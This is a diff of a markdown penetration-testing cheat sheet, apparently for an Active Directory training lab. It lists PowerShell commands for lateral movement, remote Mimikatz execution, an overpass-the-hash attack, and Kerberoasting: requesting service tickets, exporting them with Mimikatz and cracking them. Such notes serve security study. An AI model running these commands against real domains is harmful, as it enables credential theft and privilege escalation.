@@ -77,11 +77,11 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 ```
 ## Lateral Movement
 ```
--New-Pssession -Computername xz-dc.abc.local -Credential $cred : Will give new powershell session on computer xz-dc.abc.local , the variable "cred" contains the credential for the target machine.
+- New-Pssession -Computername xz-dc.abc.local -Credential $cred : Will give new powershell session on computer xz-dc.abc.local , the variable "cred" contains the credential for the target machine.
 
--Invoke-command -Scriptblock {whoami} -computername xz-dc.abc.local : It will execute command whoami on computer xz-dc.abc.local , for asking for credentiall add parameter -Credential.
+- Invoke-command -Scriptblock {whoami} -computername xz-dc.abc.local : It will execute command whoami on computer xz-dc.abc.local , for asking for credentiall add parameter -Credential.
 
-I-nvoke-command -Scriptblock ${function:Invoke-Mimikatz}  -computername xz-dc.abc.local :  It will execute Invoke-Mimikatz function on target machine , if mimikatz is loaded into it.
+- Invoke-command -Scriptblock ${function:Invoke-Mimikatz}  -computername xz-dc.abc.local :  It will execute Invoke-Mimikatz function on target machine , if mimikatz is loaded into it.
 
 -Invoke-Mimikatz -command '"sekurlsa::pth /user:studentx /domain:abc.local /ntlm: <ntlm hash of user studentx> /run:powershell.exe"' : This method is known as OverPasstheHash attack . This will open a new powershell process as studentx user.
   
@@ -89,5 +89,10 @@ I-nvoke-command -Scriptblock ${function:Invoke-Mimikatz}  -computername xz-dc.ab
 ## Privilege Escalation Using Kerberos
 
 - Find User Account Used as Service Account
--- Get-NetUser -SPN
+-      Get-NetUser -SPN
 - Requesting a TGS
+-      Add-Type -AssemblyName System.IdentityModel 
+-      New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName"
+- Export all ticket using Mimikatz
+-      Invoke-Mimikatz -Command '"kerberos::list /export"'
+- Cracking the hash using john or hashcat
